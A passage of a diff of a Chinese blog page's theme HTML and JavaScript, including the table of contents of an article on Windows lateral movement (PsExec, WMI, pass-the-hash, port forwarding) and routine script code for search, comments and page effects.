href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%AA%E5%90%91%E8%BF%90%E5%8A%A8"><span class="toc-text">什么是横向运动？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="toc-text">一个简单的例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E8%A7%86%E8%A7%92"><span class="toc-text">攻击者的视角</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E5%92%8Cuac"><span class="toc-text">管理员和UAC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E8%BF%9C%E7%A8%8B%E7%94%9F%E6%88%90%E8%BF%87%E7%A8%8B"><span class="toc-text">0x03 远程生成过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#psexec-%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-text">Psexec 执行程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-winrm-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B"><span class="toc-text">使用 WinRM 远程创建进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-sc-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1"><span class="toc-text">使用 sc 远程创建服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-text">远程创建计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-text">实践练习</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E4%BD%BF%E7%94%A8-wmi-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-text">0x04 使用 WMI 横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E-powershell-%E8%BF%9E%E6%8E%A5%E5%88%B0-wmi"><span class="toc-text">从 Powershell 连接到 WMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-wmi-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B"><span class="toc-text">使用 WMI 远程创建进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-wmi-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1"><span class="toc-text">使用 WMI 远程创建服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-wmi-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-text">使用 WMI 远程创建计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wmi-%E9%80%9A%E8%BF%87-wmi-%E5%AE%89%E8%A3%85-msi-%E5%8C%85"><span class="toc-text">WMI 通过 WMI 安装 MSI 包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-text">实践练习</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E4%BD%BF%E7%94%A8%E6%9B%BF%E4%BB%A3%E8%AE%A4%E8%AF%81%E6%9D%90%E6%96%99"><span class="toc-text">0x05 使用替代认证材料</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ntlm%E8%AE%A4%E8%AF%81"><span class="toc-text">NTLM认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E9%80%92%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-text">传递哈希值</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E6%9C%AC%E5%9C%B0-sam-%E4%B8%AD%E6%8F%90%E5%8F%96-ntlm-%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-text">从本地 SAM 中提取 NTLM 哈希值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E-lsass-%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96-ntlm-%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-text">从 LSASS 内存中提取 NTLM 哈希值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-linux-%E4%BC%A0%E9%80%92%E5%93%88%E5%B8%8C"><span class="toc-text">使用 Linux 传递哈希</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kerberos-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-text">Kerberos 身份验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E7%A5%A8"><span class="toc-text">传票</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E8%B6%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E5%AF%86%E9%92%A5"><span class="toc-text">跨越哈希&#x2F;传递密钥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-text">实践练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-the-hash"><span class="toc-text">Pass-the-Hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-the-ticket"><span class="toc-text">Pass-the-Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-the-key"><span class="toc-text">Pass-the-Key</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E6%BB%A5%E7%94%A8%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA"><span class="toc-text">0x06 滥用用户行为</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E5%8F%AF%E5%86%99%E8%82%A1%E4%BB%BD"><span class="toc-text">滥用可写股份</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8-vbs-%E8%84%9A%E6%9C%AC"><span class="toc-text">后门 .vbs 脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exe-%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8"><span class="toc-text">.exe 文件后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rdp%E5%8A%AB%E6%8C%81"><span class="toc-text">RDP劫持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-text">实践练习</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">0x07 端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-%E9%9A%A7%E9%81%93"><span class="toc-text">SSH 隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">SSH 远程端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">SSH 本地端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-socat-%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">使用 socat 进行端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C-socks"><span class="toc-text">动态端口转发和 SOCKS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-text">实践练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E5%A4%8D%E6%9D%82%E6%BC%8F%E6%B4%9E"><span class="toc-text">隧道复杂漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">0x08 参考文章</span></a></li></ol></div><div class="widget-footer">
-
-<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
-</div></aside><div class='float-panel blur'>
-  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
-    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
-  </button>
-  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
-    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
-  </button>
-</div>
-</div><div class="scripts">
-<script type="text/javascript">
-  const ctx = {
-    date_suffix: {
-      just: `刚刚`,
-      min: `分钟前`,
-      hour: `小时前`,
-      day: `天前`,
-    },
-    root : `/`,
-  };
-
-  // required plugins (only load if needs)
-  if (`local_search`) {
-    ctx.search = {};
-    ctx.search.service = `local_search`;
-    if (ctx.search.service == 'local_search') {
-      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
-      ctx.search[ctx.search.service] = service_obj;
-    }
-  }
-  const def = {
-    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
-    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
-  };
-  const deps = {
-    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
-    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
-  }
-  
-
-</script>
-
-<script type="text/javascript">
-  const utils = {
-    // 懒加载 css https://github.com/filamentgroup/loadCSS
-    css: (href, before, media, attributes) => {
-      var doc = window.document;
-      var ss = doc.createElement("link");
-      var ref;
-      if (before) {
-        ref = before;
-      } else {
-        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
-        ref = refs[refs.length - 1];
-      }
-      var sheets = doc.styleSheets;
-      if (attributes) {
-        for (var attributeName in attributes) {
-          if (attributes.hasOwnProperty(attributeName)) {
-            ss.setAttribute(attributeName, attributes[attributeName]);
-          }
-        }
-      }
-      ss.rel = "stylesheet";
-      ss.href = href;
-      ss.media = "only x";
-      function ready(cb) {
-        if (doc.body) {
-          return cb();
-        }
-        setTimeout(function () {
-          ready(cb);
-        });
-      }
-      ready(function () {
-        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
-      });
-      var onloadcssdefined = function (cb) {
-        var resolvedHref = ss.href;
-        var i = sheets.length;
-        while (i--) {
-          if (sheets[i].href === resolvedHref) {
-            return cb();
-          }
-        }
-        setTimeout(function () {
-          onloadcssdefined(cb);
-        });
-      };
-      function loadCB() {
-        if (ss.addEventListener) {
-          ss.removeEventListener("load", loadCB);
-        }
-        ss.media = media || "all";
-      }
-      if (ss.addEventListener) {
-        ss.addEventListener("load", loadCB);
-      }
-      ss.onloadcssdefined = onloadcssdefined;
-      onloadcssdefined(loadCB);
-      return ss;
-    },
-
-    js: (src, opt) => new Promise((resolve, reject) => {
-      var script = document.createElement('script');
-      if (src.startsWith('/')){
-        src = ctx.root + src.substring(1);
-      }
-      script.src = src;
-      if (opt) {
-        for (let key of Object.keys(opt)) {
-          script[key] = opt[key]
-        }
-      } else {
-        // 默认异步，如果需要同步，第二个参数传入 {} 即可
-        script.async = true
-      }
-      script.onerror = reject
-      script.onload = script.onreadystatechange = function() {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        script.onload = script.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(script)
-    }),
-
-    jq: (fn) => {
-      if (typeof jQuery === 'undefined') {
-        utils.js(deps.jquery).then(fn)
-      } else {
-        fn()
-      }
-    },
-    
-    onLoading: (el) => {
-      if (el) {
-        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
-      }
-    },
-    onLoadSuccess: (el) => {
-      if (el) {
-        $(el).find('.loading-wrap').remove();
-      }
-    },
-    onLoadFailure: (el) => {
-      if (el) {
-        $(el).find('.loading-wrap svg').remove();
-        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
-        $(el).find('.loading-wrap').addClass('error');
-      }
-    },
-    request: (el, url, callback, onFailure) => {
-      let retryTimes = 3;
-      utils.onLoading(el);
-      function req() {
-        return new Promise((resolve, reject) => {
-          let status = 0; // 0 等待 1 完成 2 超时
-          let timer = setTimeout(() => {
-            if (status === 0) {
-              status = 2;
-              timer = null;
-              reject('请求超时');
-              if (retryTimes == 0) {
-                onFailure();
-              }
-            }
-          }, 5000);
-          fetch(url).then(function(response) {
-            if (status !== 2) {
-              clearTimeout(timer);
-              resolve(response);
-              timer = null;
-              status = 1;
-            }
-            if (response.ok) {
-              return response.json();
-            }
-            throw new Error('Network response was not ok.');
-          }).then(function(data) {
-            retryTimes = 0;
-            utils.onLoadSuccess(el);
-            callback(data);
-          }).catch(function(error) {
-            if (retryTimes > 0) {
-              retryTimes -= 1;
-              setTimeout(() => {
-                req();
-              }, 5000);
-            } else {
-              utils.onLoadFailure(el);
-              onFailure();
-            }
-          });
-        });
-      }
-      req();
-    },
-  };
-</script>
-
-<script>
-  const sidebar = {
-    leftbar: () => {
-      if (l_body) {
-        l_body.toggleAttribute('leftbar');
-        l_body.removeAttribute('rightbar');
-      }
-    },
-    rightbar: () => {
-      if (l_body) {
-        l_body.toggleAttribute('rightbar');
-        l_body.removeAttribute('leftbar');
-      }
-    },
-    dismiss: () => {
-      if (l_body) {
-        l_body.removeAttribute('leftbar');
-        l_body.removeAttribute('rightbar');
-      }
-    },
-    toggleTOC: () => {
-      document.querySelector('#data-toc').classList.toggle('collapse');
-    }
-  }
-</script>
-
-<!-- required -->
-<script src="/js/main.js?v=1.28.1" async></script>
-
-<!-- optional -->
-
-  <script>
-    function load_twikoo() {
-        if (!document.querySelectorAll("#twikoo_container")[0]) return;
-        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
-            const el = document.getElementById("twikoo_container");
-            var path = el.getAttribute('comment_id');
-            if (!path) {
-                path = decodeURI(window.location.pathname);
-            }
-            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
-                el: '#twikoo_container',
-                path: path,
-            }));
-        });
-    }
-
-    window.addEventListener('DOMContentLoaded', (event) => {
-        load_twikoo();
-    });
-</script>
-
-
-
-<script defer>
-  window.addEventListener('DOMContentLoaded', (event) => {
-    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
-    for (let id of Object.keys(ctx.services)) {
-      const js = ctx.services[id].js;
-      if (id == 'siteinfo') {
-        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
-        if (ctx.cardlinks?.length > 0) {
-          utils.js(js, { defer: true }).then(function () {
-            setCardLink(ctx.cardlinks);
-          });
-        }
-      } else {
-        const els = document.getElementsByClassName(`ds-${id}`);
-        if (els?.length > 0) {
-          utils.jq(() => {
-            if (id == 'timeline' || 'memos' || 'marked') {
-              utils.js(deps.marked).then(function () {
-                utils.js(js, { defer: true });
-              });
-            } else {
-              utils.js(js, { defer: true });
-            }
-          });
-        }
-      }
-    }
-  });
-</script>
-
-<script>
-  window.addEventListener('DOMContentLoaded', (event) => {
-    ctx.search = {
-      path: `/search.json`,
-    }
-    utils.js('/js/search/local-search.js', { defer: true });
-  });
-</script><script>
-  window.FPConfig = {
-    delay: 0,
-    ignoreKeywords: [],
-    maxRPS: 5,
-    hoverDelay: 25
-  };
-</script>
-<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
-<script>
-  // https://www.npmjs.com/package/vanilla-lazyload
-  // Set the options globally
-  // to make LazyLoad self-initialize
-  window.lazyLoadOptions = {
-    elements_selector: ".lazy",
-  };
-  // Listen to the initialization event
-  // and get the instance of LazyLoad
-  window.addEventListener(
-    "LazyLoad::Initialized",
-    function (event) {
-      window.lazyLoadInstance = event.detail.instance;
-    },
-    false
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
   );
-  document.addEventListener('DOMContentLoaded', function () {
-    window.lazyLoadInstance?.update();
-  });
-</script><script>
-  ctx.fancybox = {
-    selector: `.timenode p>img`,
-    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
-    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
-  };
-  var selector = '[data-fancybox]:not(.error)';
-  if (ctx.fancybox.selector) {
-    selector += `, ${ctx.fancybox.selector}`
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
+  const initValine = () => {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
+      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
+      avatar: 'mp',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
   }
-  var needFancybox = document.querySelectorAll(selector).length !== 0;
-  if (!needFancybox) {
-    const els = document.getElementsByClassName('ds-memos');
-    if (els != undefined && els.length > 0) {
-      needFancybox = true;
+
+  const loadValine = async () => {
+    if (typeof Valine === 'function') initValine()
+    else {
+      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
+      initValine()
     }
   }
-  if (needFancybox) {
-    utils.css(ctx.fancybox.css);
-    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
-      Fancybox.bind(selector, {
-        hideScrollbar: false,
-        Thumbs: {
-          autoStart: false,
-        },
-        caption: (fancybox, slide) => {
-          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getIcon = (icon, mail) => {
+    if (icon) return icon
+    let defaultIcon = '?d=mp'
+    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
+    return iconUrl
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'data-lazy-src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
         }
-      });
-    })
+
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom && ($dom.innerHTML= result)
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
   }
-</script>
-<script>
-  window.addEventListener('DOMContentLoaded', (event) => {
-    const swiper_api = document.getElementById('swiper-api');
-    if (swiper_api != undefined) {
-      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
-      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
-        const effect = swiper_api.getAttribute('effect') || '';
-        var swiper = new Swiper('.swiper#swiper-api', {
-          slidesPerView: 'auto',
-          spaceBetween: 8,
-          centeredSlides: true,
-          effect: effect,
-          rewind: true,
-          pagination: {
-            el: '.swiper-pagination',
-            clickable: true,
-          },
-          navigation: {
-            nextEl: '.swiper-button-next',
-            prevEl: '.swiper-button-prev',
-          },
-        });
-      })
+
+  const getComment = () => {
+    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'
+
+    var settings = {
+      "method": "GET",
+      "headers": {
+        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
+        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
+        "Content-Type": "application/json"
+      },
     }
-  });
-</script>
-<script>
-  document.addEventListener('DOMContentLoaded', function () {
-    window.codeElements = document.querySelectorAll('.code');
-    if (window.codeElements.length > 0) {
-      ctx.copycode = {
-        default_text: `Copy`,
-        success_text: `Copied`,
-        toast: `复制成功`,
-      };
